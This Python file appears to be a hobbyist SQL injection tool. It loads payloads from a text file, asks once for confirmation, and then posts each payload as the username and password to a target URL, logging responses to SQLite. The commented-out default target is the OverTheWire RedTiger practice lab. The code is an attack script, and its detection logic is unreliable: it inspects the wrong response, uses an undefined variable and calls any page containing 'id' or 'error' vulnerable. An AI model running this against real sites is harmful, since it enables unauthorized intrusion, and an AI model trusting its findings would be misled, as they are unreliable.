import sys
# sys.path.append(r"D:\SQLjj\SQLJ\Database")
# from database import main_prog,extraction
import asyncio
import requests
from colorama import Fore,init
import re
import glob
import os
import socket
import time
from datetime import datetime
import sqlite3
# from database import create_database_for_Captures

init()

################################################################
attack_type = "generic SQL injection"
###################################################################

""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""

##################################################################

pattern = r"\\berror\\b"
htmlpattern = r"\\bid\\b"
generic_capture = []

#######################################################################


            


async def generic_sql_attack(urls):
    """This attack is when we are able to alter the database tables and gather information out of it"""
    try:
        global pattern,htmlpattern
        ##################################################################################
        #
        #######################################################################################
        filename = "genericsql.txt"
        current_directory = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(current_directory, filename)

        with open(file_path, "r") as file:
            payload = file.read()
            rows = payload.split("\n")
            sorted_rows = sorted(rows)
            sorted_payload = "\n".join(sorted_rows)
            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload))
            requests.packages.urllib3.disable_warnings()  # Disable SSL warnings
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(urls,verify=False)
            if req.status_code == 200:
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the ip address: {urls} Do you want to send the payload to the website? ")

                if ask.lower() == "y":
                    for line in sorted_payload.split("\n"):
                        #############################################################33
                        params = {
                            "username": line,
                            "password": line
                        }
                        ##############################################################################
                        # print(line)
                        global ack
                        ack = requests.post(url=urls, data=params,verify=False)
                        print(f"[{datetime.now()}]","|Current payload: |", line,"|with status code|:",ack.status_code,"|Attack:|",attack_type)
                        print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
                        await asyncio.sleep(5)
                        if "error" in ack.text:
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:","Attack:|",attack_type)
                            
                        vuln = re.findall(pattern=pattern,string=str(ack.text),flags=re.IGNORECASE)
                        htmlVULN = re.findall(pattern=htmlpattern,string=str(ack.text),flags=re.IGNORECASE)
                        if vuln:
                            print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found in the data: |", vuln," | with the count of: |",len(vuln)if len(str(htmlVULN)) != 0 else "Nothing found ","|Attack:|",attack_type)
                            await asyncio.sleep(3)
                        
                        if htmlVULN:
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found in html status:|",htmlVULN,"|with the count of:|",  len(htmlVULN) if len(str(htmlVULN)) != 0 else "|Nothing found|","|attack:|",attack_type)
                            await asyncio.sleep(3)
                            htmlVulnerbale = True
                            
                    
                        # htmlVulner
                        word = "id" in req.text
                        errword = "error" in req.text
                        if word:
                            print(f"[{datetime.now()}]",Fore.GREEN + "|Vulnerability found|:",str("error" in req.text),"with the count of:",len(htmlVULN),"|Attack:|",attack_type)
                            await asyncio.sleep(3)
                            # databaseVuln = True
                        
                        if errword:
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:",str("id" in req.text),"with the count of:",len(htmlVULN),"|Attack:|",attack_type)
                            await asyncio.sleep(3)
                            # databaseVuln = True
                            
                        
                            
                    if req.status_code == 302:
                        print(f"[{datetime.now()}]","Could inject the sq;; to the website:",line,"|Attack:|",attack_type)
                        done = True  
                        
                    if "Admin" in vuln or "admin" in vuln or "Admin" in ack.text or "admin" in ack.text or "Admin" in htmlVULN or "admin" in htmlVULN:
                        print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could connect to the website but did found injectable area on the website.","|Attack:|",attack_type)           
        # await create_database_for_Captures()
        conn = sqlite3.connect("SQLJresult.db")
        cur = conn.cursor()

        sql = "INSERT INTO Datas (Data,attacktype) VALUES (?,?)"
        # values = [attack_type,(ack.text,), (str(headers),), (str(ack.status_code),), (str(vuln,),), (str(htmlVULN),), (str(errword),), (str(word),), (str(req.status_code),), (str(ack.text),)]
        values = [(attack_type, str(ack.text)), (attack_type, str(headers)), (attack_type, str(ack.status_code)), (attack_type, str(vuln)), (attack_type, str(htmlVULN)), (attack_type, str(errword)), (attack_type, str(word)), (attack_type, str(req.status_code)), (attack_type, str(ack.text))]

        cur.executemany(sql, values)

        conn.commit()
        conn.close()      

    except Exception as e:
        print(f"[{datetime.now()}]  Error: {str(e)}")
        
    except UnicodeEncodeError:
        pass
    
    except KeyboardInterrupt:
        pass
    
        # ch = input(f"[{datetime.now()}]",Fore.RED+"[!] Are you sure that you want to exit?")
        # if ch == "y":
        #     raise SystemExit
        # else:
        #     pass
        
    except ConnectionAbortedError as e:
        print(f"[{datetime.now()}]","[ERROR]ConnectionAbortedError:",e)
        
    except ConnectionError as e:
        print(f"[{datetime.now()}]","[ERROR]ConnectionError:",e)
        
    except ConnectionRefusedError as e:
        print(f"[{datetime.now()}]","[ERROR]ConnectionRefusedError",e)
        
    except ConnectionResetError as e:
        print(f"[{datetime.now()}]","[ERROR]ConnectionResetError:",e)
        
    except KeyboardInterrupt:
        # ch = input(f"[{datetime.now()}]",Fore.RED+"[!] Are you sure that you want to exit?")
        # if ch == "y":
        #     raise SystemExit
        pass
    
    except MemoryError:
        import psutil
        # Get the system memory information
        memory = psutil.virtual_memory()

        # Calculate the threshold for 80% memory usage
        threshold = memory.total * 0.9

        # Check if the used memory is greater than the threshold
        Err =  memory.used <= threshold
        while not Err:
            memory = psutil.virtual_memory()
            Err = memory.used <= threshold
            print("Please Release you RAM space to continue the application")
            await asyncio.sleep(5)
# asyncio.run(Memory_handling())
       
    
    except Exception as e:
        print(f" {datetime.now()} Error: {str(e)}")
        
        
    finally:
        pass
        # global generic_capture
        # print(f"[{datetime.now()}]",Fore.BLUE+f"""[INFO] The final result of html response:
        #             \n{ack.text}\n     """)
        # generic_capture.append(ack.text)
        # print(Fore.RED+"wrote")
        # print(generic_capture)
        # with open("captures.txt","w") as file:
        #     file.write(ack.text)
        #     if databaseVuln is True:
        #         file.write("[INFO] database is vulnerable")
            
        #     if htmlVulnerbale is True:
        #         file.write("[INFO] html is vulnerable")
                
        
        
        

# asyncio.run(generic_sql_attack("https://redtiger.labs.overthewire.org/"))
# if __name__ != "main":
#     pass      





